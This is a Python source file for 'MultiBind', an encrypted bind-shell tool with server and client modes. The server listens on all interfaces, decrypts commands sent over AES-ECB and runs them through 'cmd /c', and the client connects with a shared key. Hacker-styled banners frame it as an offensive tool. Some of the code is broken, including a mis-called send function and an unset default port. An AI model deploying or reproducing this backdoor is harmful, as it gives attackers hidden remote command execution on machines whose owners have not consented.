
import socket
import subprocess
import threading
import argparse
import platform
import time
import requests
import os
from colorama import init, Fore, Back, Style
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

os_type = platform.platform()
pwd = os.getcwd

port = 5757
MAX_BUFFER = 4096


class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()

    def decrypt(self, encrypted):
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)),
                     AES.block_size)

    def __str__(self):
        return "Key -> {}".format(self.key.hex())


def encrypted_send(s, msg):
    s.send(cipher.encrypt(msg).encode("latin-1"))


def haxor_print(text, leading_spaces=0):

    text_chars = list(text)
    current, mutated = '', ''

    for i in range(len(text)):

        original = text_chars[i]
        current += original
        mutated += f'\033[1;38;5;82m{text_chars[i].upper()}\033[0m'
        print(f'\r{" " * leading_spaces}{mutated}', end='')
        time.sleep(0.05)
        print(f'\r{" " * leading_spaces}{current}', end='')
        mutated = current

    print(f'\r{" " * leading_spaces}{text}\n')


def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            return response.json()['ip']
        else:
            return "Failed to fetch public IP"
    except Exception as e:
        return "Error: " + str(e)


public_ip = get_public_ip()


def execute_bash(bash):
    try:
        output = subprocess.check_output("bash {}".format(bash),
                                         stderr=subprocess.STDOUT)
    except:
        output = b"Failed to Execute Command!"
    return output


def execute_cmd(cmd):
    try:
        output = subprocess.check_output(
            "cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        output = b"Failed to Execute Command!"
    return output


def decode_and_strip(s):
    return s.decode("latin-1").strip()


def shell_thread(s):
    s.send(b"[+] Binded")

    try:
        while True:
            encrypted_send(s, b"\r\nMultiBind Shell> ")

            data = s.recv(MAX_BUFFER)
            if data:
                buffer = cipher.decrypt(decode_and_strip(data))
                buffer = decode_and_strip(buffer)

                if not buffer or buffer == "exit":
                    s.close()
                    exit()

            print("> Executing Command: '{}'".format(buffer))
            encrypted_send(execute_cmd(buffer))

    except:
        s.close()
        exit()


def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            s.send(data.encode("latin-1"))
    except:
        s.close()
        exit()


def recv_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                data = cipher.decrypt(data).decode("latin-1")
                print(data, end="", flush=True)
    except:
        s.close()
        exit()


def banner_server():
    print(Fore.RED + """
   ▄▄▄▄███▄▄▄▄   ███    █▄   ▄█           ███      ▄█ 
 ▄██▀▀▀███▀▀▀██▄ ███    ███ ███       ▀█████████▄ ███ 
 ███   ███   ███ ███    ███ ███          ▀███▀▀██ ███▌
 ███   ███   ███ ███    ███ ███           ███   ▀ ███▌
 ███   ███   ███ ███    ███ ███           ███     ███▌
 ███   ███   ███ ███    ███ ███           ███     ███ 
 ███   ███   ███ ███    ███ ███▌    ▄     ███     ███ 
  ▀█   ███   █▀  ████████▀  █████▄▄██    ▄████▀   █▀  
                            ▀                         
▀█████████▄   ▄█  ███▄▄▄▄   ████████▄                 
  ███    ███ ███  ███▀▀▀██▄ ███   ▀███                
  ███    ███ ███▌ ███   ███ ███    ███                
 ▄███▄▄▄██▀  ███▌ ███   ███ ███    ███                
▀▀███▀▀▀██▄  ███▌ ███   ███ ███    ███                
  ███    ██▄ ███  ███   ███ ███    ███                
  ███    ███ ███  ███   ███ ███   ▄███                
▄█████████▀  █▀    ▀█   █▀  ████████▀                                                               
        """ + Fore.RESET)
    haxor_print("Bind The World: Server", 0)


def banner_client():
    print(Fore.CYAN + """
   ▄▄▄▄███▄▄▄▄   ███    █▄   ▄█           ███      ▄█ 
 ▄██▀▀▀███▀▀▀██▄ ███    ███ ███       ▀█████████▄ ███ 
 ███   ███   ███ ███    ███ ███          ▀███▀▀██ ███▌
 ███   ███   ███ ███    ███ ███           ███   ▀ ███▌
 ███   ███   ███ ███    ███ ███           ███     ███▌
 ███   ███   ███ ███    ███ ███           ███     ███ 
 ███   ███   ███ ███    ███ ███▌    ▄     ███     ███ 
  ▀█   ███   █▀  ████████▀  █████▄▄██    ▄████▀   █▀  
                            ▀                         
▀█████████▄   ▄█  ███▄▄▄▄   ████████▄                 
  ███    ███ ███  ███▀▀▀██▄ ███   ▀███                
  ███    ███ ███▌ ███   ███ ███    ███                
 ▄███▄▄▄██▀  ███▌ ███   ███ ███    ███                
▀▀███▀▀▀██▄  ███▌ ███   ███ ███    ███                
  ███    ██▄ ███  ███   ███ ███    ███                
  ███    ███ ███  ███   ███ ███   ▄███                
▄█████████▀  █▀    ▀█   █▀  ████████▀                                                               
        """ + Fore.RESET)
    haxor_print("Bind the World: Client", 0)


def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", port))
    s.listen()
    banner_server()
    haxor_print("[*] Starting Server", 0)
    haxor_print("[+] Opened Port: {}{}".format(port, Fore.GREEN), 0)
    while True:
        client_socket, addr = s.accept()
        print(Fore.RESET + "[+] New Bind From: {}".format(public_ip))
        threading.Thread(target=shell_thread, args=(client_socket,)).start()


def client(ip):
    banner_client()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    haxor_print("[*] Connecting to MultiBind")
    print("[+] OS Detected: {}{}{}".format(Fore.GREEN, os_type, Fore.RESET))

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()


parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true",
                    help="Setup a bind shell", required=False)

parser.add_argument("-c", "--connect",
                    help="Connect to a bind shell", required=False)

parser.add_argument("-p", "--port", type=int,
                    help="Change listening port", required=False)

parser.add_argument("-k", "--key", help="Encryption key",
                    type=str, required=False)

args = parser.parse_args()

port = args.port

if args.connect and not args.key:
    parser.error(Style.BRIGHT + "-c Connection Argument Requires -k Key!" +
                 Fore.RESET)
    
if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher()

print(cipher)

if args.listen:
    server()
elif args.connect:
    client(args.connect)
